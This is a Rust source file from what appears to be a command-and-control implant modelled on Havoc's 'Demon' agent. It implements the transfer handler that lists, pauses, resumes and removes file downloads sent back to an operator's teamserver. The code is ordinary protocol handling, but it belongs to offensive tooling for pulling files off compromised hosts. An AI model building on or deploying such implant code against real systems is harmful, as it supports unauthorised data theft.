//! `COMMAND_TRANSFER` (2530) handler — list, stop, resume, and remove active downloads.

use red_cell_common::demon::{DemonCommand, DemonTransferCommand};
use tracing::{info, warn};

use crate::download::{DOWNLOAD_REASON_REMOVED, DownloadState, DownloadTracker};

use super::{DispatchResult, Response, parse_u32_le, write_u32_le};

// ─── COMMAND_TRANSFER (2530) ────────────────────────────────────────────────

/// Dispatch a `CommandTransfer` task to manage active downloads.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
pub(super) fn handle_transfer(payload: &[u8], downloads: &mut DownloadTracker) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandTransfer: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonTransferCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandTransfer: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandTransfer dispatch");

    let rest = &payload[offset..];
    match subcmd {
        DemonTransferCommand::List => handle_transfer_list(subcmd_raw, downloads),
        DemonTransferCommand::Stop => handle_transfer_stop(subcmd_raw, rest, downloads),
        DemonTransferCommand::Resume => handle_transfer_resume(subcmd_raw, rest, downloads),
        DemonTransferCommand::Remove => handle_transfer_remove(subcmd_raw, rest, downloads),
    }
}

/// `Transfer::List (0)` — enumerate all active downloads.
///
/// Outgoing payload (LE): `[subcmd: u32]` followed by per-entry:
/// `[file_id: u32][read_size: u32][state: u32]`
fn handle_transfer_list(subcmd_raw: u32, downloads: &DownloadTracker) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);

    for (file_id, read_size, state) in downloads.list() {
        write_u32_le(&mut out, file_id);
        #[allow(clippy::cast_possible_truncation)]
        write_u32_le(&mut out, read_size as u32);
        write_u32_le(&mut out, state.into());
    }

    info!(count = downloads.len(), "Transfer::List");
    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
}

/// `Transfer::Stop (1)` — pause a running download.
///
/// Incoming args (LE): `[file_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
fn handle_transfer_stop(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    handle_transfer_set_state(subcmd_raw, rest, downloads, DownloadState::Stopped, "stopped")
}

/// `Transfer::Resume (2)` — resume a stopped download.
///
/// Incoming args (LE): `[file_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
fn handle_transfer_resume(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    handle_transfer_set_state(subcmd_raw, rest, downloads, DownloadState::Running, "resumed")
}

fn handle_transfer_set_state(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
    new_state: DownloadState,
    label: &str,
) -> DispatchResult {
    let mut offset = 0;
    let file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!(action = label, "Transfer: failed to parse file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let found = if let Some(entry) = downloads.get_mut(file_id) {
        entry.state = new_state;
        info!(action = label, file_id = format_args!("{file_id:08x}"), "Transfer state updated");
        1u32
    } else {
        info!(action = label, file_id = format_args!("{file_id:08x}"), "Transfer target not found");
        0u32
    };

    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, found);
    write_u32_le(&mut out, file_id);

    DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
}

/// `Transfer::Remove (3)` — cancel and remove a download.
///
/// Incoming args (LE): `[file_id: u32]`
/// Outgoing payload (LE): `[subcmd: u32][found: u32][file_id: u32]`
///
/// When found, also emits a second Transfer packet with `DOWNLOAD_REASON_REMOVED`
/// to tell the teamserver to close the download on its end (matching Demon behaviour).
fn handle_transfer_remove(
    subcmd_raw: u32,
    rest: &[u8],
    downloads: &mut DownloadTracker,
) -> DispatchResult {
    let mut offset = 0;
    let file_id = match parse_u32_le(rest, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("Transfer::Remove: failed to parse file_id: {e}");
            return DispatchResult::Ignore;
        }
    };

    let found = if let Some(entry) = downloads.get_mut(file_id) {
        entry.state = DownloadState::Remove;
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Remove: marked for removal");
        1u32
    } else {
        info!(file_id = format_args!("{file_id:08x}"), "Transfer::Remove: not found");
        0u32
    };

    // Primary response: [subcmd][found][file_id]
    let mut out = Vec::new();
    write_u32_le(&mut out, subcmd_raw);
    write_u32_le(&mut out, found);
    write_u32_le(&mut out, file_id);

    if found == 1 {
        // Second packet: tell the teamserver to close its download state.
        let mut close_out = Vec::new();
        write_u32_le(&mut close_out, subcmd_raw);
        write_u32_le(&mut close_out, file_id);
        write_u32_le(&mut close_out, DOWNLOAD_REASON_REMOVED);

        DispatchResult::MultiRespond(vec![
            Response::new(DemonCommand::CommandTransfer, out),
            Response::new(DemonCommand::CommandTransfer, close_out),
        ])
    } else {
        DispatchResult::Respond(Response::new(DemonCommand::CommandTransfer, out))
    }
}
